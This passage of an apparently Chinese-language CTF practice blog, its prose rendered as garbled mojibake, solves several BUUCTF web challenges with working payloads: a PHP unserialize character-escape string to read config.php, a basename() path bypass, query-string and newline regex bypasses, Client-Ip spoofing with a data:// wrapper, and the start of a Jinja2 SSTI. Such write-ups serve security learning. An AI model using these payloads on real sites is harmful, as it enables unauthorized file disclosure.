<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$profile</span>  <span class="o">==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: update.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$profile</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$profile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$phone</span> <span class="o">=</span> <span class="nv">$profile</span><span class="p">[</span><span class="s1">&#39;phone&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$email</span> <span class="o">=</span> <span class="nv">$profile</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$nickname</span> <span class="o">=</span> <span class="nv">$profile</span><span class="p">[</span><span class="s1">&#39;nickname&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$photo</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$profile</span><span class="p">[</span><span class="s1">&#39;photo&#39;</span><span class="p">]));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$escape</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;\&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;\\\\&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$escape</span> <span class="o">=</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nx">implode</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="nv">$escape</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$string</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="nv">$escape</span><span class="p">,</span> <span class="s1">&#39;_&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nv">$safe</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;select&#39;</span><span class="p">,</span> <span class="s1">&#39;insert&#39;</span><span class="p">,</span> <span class="s1">&#39;update&#39;</span><span class="p">,</span> <span class="s1">&#39;delete&#39;</span><span class="p">,</span> <span class="s1">&#39;where&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$safe</span> <span class="o">=</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nx">implode</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="nv">$safe</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;/i&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="nv">$safe</span><span class="p">,</span> <span class="s1">&#39;hacker&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œåˆ©ç”¨è¿™ä¸ªè¿‡æ»¤å™¨æ¥ç»•è¿‡ï¼Œå‚è€ƒå‰é¢çš„phpååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</p>
<p>åœ¨nicknameçš„ä½ç½®å†™å…¥å¤§é‡çš„é»‘åå•ä½¿å¾—è¢«æ›¿æ¢ï¼Œç„¶åå°±èƒ½åŒ¹é…åé¢ä¼ªé€ çš„photoå€¼ï¼Œè¯»å–config.php</p>
<p>è¿™é‡Œæˆ‘ä»¬è¦ä¼ªé€ çš„photoä¸º</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;;s:5:&#34;photo&#34;;s:10:&#34;config.php&#34;;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä½†æ˜¯å› ä¸ºå‰é¢çš„nicknameæœ‰é•¿åº¦é™åˆ¶è¦ç”¨æ•°ç»„ç»•è¿‡</p>
<p>å› ä¸ºå°†nicknameæ”¹ä¸ºæ•°ç»„æ—¶ï¼Œå®ƒåœ¨åºåˆ—åŒ–æ—¶ä¸ä¼šåƒå­—ç¬¦ä¸€æ ·é—­åˆï¼Œæ‰€ä»¥è¦åŠ å¤šä¸€ä¸ª<code>}</code>ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;;}s:5:&#34;photo&#34;;s:10:&#34;config.php&#34;;}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&#34;;}s:5:&#34;photo&#34;;s:10:&#34;config.php&#34;;}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250223132907688.png"
	width="1362"
	height="555"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250223132907688_hu8267886857713824598.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250223132907688_hu8090525025974880684.png 1024w"
	loading="lazy"
	
		alt="image-20250223132907688"
	
	
		class="gallery-image" 
		data-flex-grow="245"
		data-flex-basis="588px"
	
></p>
<p>æ”¾åŒ…ä¹‹åï¼ŒæŠŠå›¾ç‰‡çš„base64è§£ç å‡ºæ¥å°±è¡Œäº†</p>
<h2 id="zer0pts2020can-you-guess-it">[Zer0pts2020]Can you guess it?
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;config.php&#39;</span><span class="p">;</span> <span class="c1">// FLAG is defined in config.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/config\.php\/*$/i&#39;</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">exit</span><span class="p">(</span><span class="s2">&#34;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;source&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">highlight_file</span><span class="p">(</span><span class="nx">basename</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl">  <span class="k">exit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$secret</span> <span class="o">=</span> <span class="nx">bin2hex</span><span class="p">(</span><span class="nx">random_bytes</span><span class="p">(</span><span class="mi">64</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;guess&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$guess</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;guess&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">hash_equals</span><span class="p">(</span><span class="nv">$secret</span><span class="p">,</span> <span class="nv">$guess</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$message</span> <span class="o">=</span> <span class="s1">&#39;Congratulations! The flag is: &#39;</span> <span class="o">.</span> <span class="nx">FLAG</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$message</span> <span class="o">=</span> <span class="s1">&#39;Wrong.&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;!doctype html&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;html lang=&#34;en&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">  &lt;head&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;meta charset=&#34;utf-8&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;title&gt;Can you guess it?&lt;/title&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">  &lt;/head&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">  &lt;body&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;p&gt;If your guess is correct, I&#39;ll give you the flag.&lt;/p&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;p&gt;&lt;a href=&#34;?source&#34;&gt;Source&lt;/a&gt;&lt;/p&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;hr&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php if (isset($message)) { ?&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php } ?&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;form action=&#34;index.php&#34; method=&#34;POST&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">      &lt;input type=&#34;text&#34; name=&#34;guess&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">      &lt;input type=&#34;submit&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;/form&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">  &lt;/body&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt;
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸‹é¢é‚£ä¸ªhashåŒ¹é…éšæœºæ•°è‚¯å®šä¸è¡Œï¼Œç”¨ä¸Šé¢çš„basenameçš„bugç»•è¿‡</p>
<p><a class="link" href="https://bugs.php.net/bug.php?id=62119"  target="_blank" rel="noopener"
    >PHP :: Bug #62119 :: basename broken with non-ASCII-chars</a></p>
<p>å®ƒä¼šå»æ‰æ–‡ä»¶åå¼€å¤´çš„éASCIIå€¼ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">var_dump</span><span class="p">(</span><span class="n">basename</span><span class="p">(</span><span class="s2">&#34;xffconfig.php&#34;</span><span class="p">));</span> <span class="o">//</span> <span class="o">=&gt;</span> <span class="n">config</span><span class="o">.</span><span class="n">php</span>
</span></span><span class="line"><span class="cl"><span class="n">var_dump</span><span class="p">(</span><span class="n">basename</span><span class="p">(</span><span class="s2">&#34;config.php/xff&#34;</span><span class="p">));</span> <span class="o">//</span> <span class="o">=&gt;</span> <span class="n">config</span><span class="o">.</span><span class="n">php</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™æ ·å°±èƒ½ç»•è¿‡åŒ¹é…ï¼Œç”¨config.php/%ff</p>
<p>å› ä¸ºbasenameå‡½æ•°çš„ç‰¹æ€§ï¼Œå®ƒä¼šè¿”å›æ–‡ä»¶å</p>
<p><code>$_SERVER['PHP_SELF']</code>ä¼šè·å–æˆ‘ä»¬å½“å‰çš„è®¿é—®è·¯å¾„,æˆ‘ä»¬æ„é€ index.php/config.php,å°±ä¼šè¿”å›config.php</p>
<p>æœ€åè®¿é—®sourceå¾—åˆ°flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">index.php/config.php/%ff?source
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="mrctf2020å¥—å¨ƒ">[MRCTF2020]å¥—å¨ƒ
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;!--</span>
</span></span><span class="line"><span class="cl"><span class="c1">//1st
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$query</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span> <span class="nx">substr_count</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="s1">&#39;_&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="mi">0</span> <span class="o">||</span> <span class="nx">substr_count</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="s1">&#39;%5f&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Y0u are So cutE!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b_u_p_t&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">&#39;23333&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^23333$/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b_u_p_t&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;you are going to the next ~&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="o">!--&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>$_SERVER['QUERY_STRING']</code>è¿™ä¸ªä¼šåŒ¹é…ä¼ å…¥çš„?ä¹‹åçš„å­—ç¬¦</p>
<p><code>_</code>å¯ä»¥ç”¨ç©ºæ ¼æˆ–è€…<code>.</code>ç»•è¿‡ï¼Œ/23333$/è¿™ä¸ªåªæœ‰å°¾éƒ¨æ˜¯23333æ‰ä¼šè¢«åŒ¹é…åˆ°</p>
<p>ç”¨23333%0Aç»•è¿‡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?b u p t=23333%0A
</span></span><span class="line"><span class="cl">æˆ–è€…
</span></span><span class="line"><span class="cl">?b.u.p.t=23333%0A
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿›å…¥ä¸‹ä¸€å±‚ï¼Œæ³¨é‡Šé‡Œé¢ä¸€ä¸²jsfuckä¸¢ç»™æ§åˆ¶å°</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250223153905373.png"
	width="1914"
	height="948"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250223153905373_hu11382517387856506685.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250223153905373_hu12513487781538241187.png 1024w"
	loading="lazy"
	
		alt="image-20250223153905373"
	
	
		class="gallery-image" 
		data-flex-grow="201"
		data-flex-basis="484px"
	
></p>
<p>postä¼ Merak,è¿›å…¥ä¸‹ä¸€å±‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;takeip.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;.&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;flag.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;Merak&#39;</span><span class="p">])){</span> 
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">change</span><span class="p">(</span><span class="nv">$v</span><span class="p">){</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$v</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$re</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span> 
</span></span><span class="line"><span class="cl">        <span class="nv">$re</span> <span class="o">.=</span> <span class="nx">chr</span> <span class="p">(</span> <span class="nx">ord</span> <span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">+</span> <span class="nv">$i</span><span class="o">*</span><span class="mi">2</span> <span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$re</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;Local access only!&#39;</span><span class="o">.</span><span class="s2">&#34;&lt;br/&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$ip</span> <span class="o">=</span> <span class="nx">getIp</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$ip</span><span class="o">!=</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;Sorry,you don&#39;t have permission!  Your ip is :&#34;</span><span class="o">.</span><span class="nv">$ip</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$ip</span> <span class="o">===</span> <span class="s1">&#39;127.0.0.1&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;2333&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="s1">&#39;todat is a happy day&#39;</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;Your REQUEST is:&#34;</span><span class="o">.</span><span class="nx">change</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nx">change</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]));</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">  
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œipè¦æ±‚æ˜¯127.0.0.1</p>
<p>æ·»åŠ <code>Client-Ip:127.0.0.1</code></p>
<p>2333å‚æ•°ç”¨dataåè®®æˆ–è€…php://inputä¼ postä¹Ÿè¡Œ</p>
<p>è€Œfileè¦åŠ å¯†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$v</span><span class="o">=</span><span class="s1">&#39;flag.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$re</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$re</span><span class="o">.=</span><span class="nx">chr</span> <span class="p">(</span> <span class="nx">ord</span> <span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">-</span> <span class="nv">$i</span><span class="o">*</span><span class="mi">2</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$re</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250223154857700.png"
	width="771"
	height="147"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250223154857700_hu2327762203083936473.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250223154857700_hu8913719278668031190.png 1024w"
	loading="lazy"
	
		alt="image-20250223154857700"
	
	
		class="gallery-image" 
		data-flex-grow="524"
		data-flex-basis="1258px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?2333=data://text/plain,todat%20is%20a%20happy%20day&amp;file=ZmpdYSZmXGI=
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250223160749281.png"
	width="1860"
	height="734"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250223160749281_hu1763705911233221281.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250223160749281_hu2011737831780046975.png 1024w"
	loading="lazy"
	
		alt="image-20250223160749281"
	
	
		class="gallery-image" 
		data-flex-grow="253"
		data-flex-basis="608px"
	
></p>
<h2 id="cscctf-2019-qualflasklight">[CSCCTF 2019 Qual]FlaskLight
</h2><p>jinja2çš„ssti</p>
<p>æŸ¥æ‰¾åˆ°warningsç±»åœ¨59</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250223161932486.png"
	width="1213"
	height="577"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250223161932486_hu3652242849461894680.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250223161932486_hu13968972118909050997.png 1024w"
	loading="lazy"
	
		alt="image-20250223161932486"
	
	
		class="gallery-image" 
		data-flex-grow="210"
		data-flex-basis="504px"
	
></p>
<p>ä½†æ˜¯åé¢å°±ä¼šå›æ˜¾500çŠ¶æ€æ€€ç–‘è¿‡æ»¤äº†global</p>
<p>æ‹¼æ¥ç»•è¿‡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
